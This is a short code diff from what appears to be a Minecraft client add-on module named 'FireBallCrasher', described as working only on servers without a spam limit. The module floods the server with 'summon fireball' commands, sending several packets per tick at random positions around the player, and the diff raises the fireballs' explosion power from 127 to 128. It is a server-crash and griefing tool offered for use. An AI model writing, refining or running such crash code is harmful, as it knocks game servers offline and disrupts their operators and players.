@@ -25,8 +25,6 @@ public class FIREBALLCRASHER extends Module {
         super(AddonTemplate.CATEGORY, "FireBallCrash", "Only Working No Spam Limit Server!!!!!!!");
     }
 
-    private int length = 2032; // 이게 좋은 코드
-
     private final Setting<Integer> packets = sgGeneral.add(new IntSetting.Builder()
         .name("Packets per tick")
         .description("Amount of packets sent each tick")
@@ -46,7 +44,7 @@ public class FIREBALLCRASHER extends Module {
         double z = pz + (rand.nextDouble() * 20 - 10);
         double y = py + -1; // 위에서 떨어뜨리기
         String message = String.format(
-            "summon fireball %.2f %.2f %.2f {ExplosionPower:127, Motion:[0.0,-10.0,0.0]}",
+            "summon fireball %.2f %.2f %.2f {ExplosionPower:128, Motion:[0.0,-10.0,0.0]}",
             x, y, z
         );
         for (int i = 0; i < packets.get(); i++) {
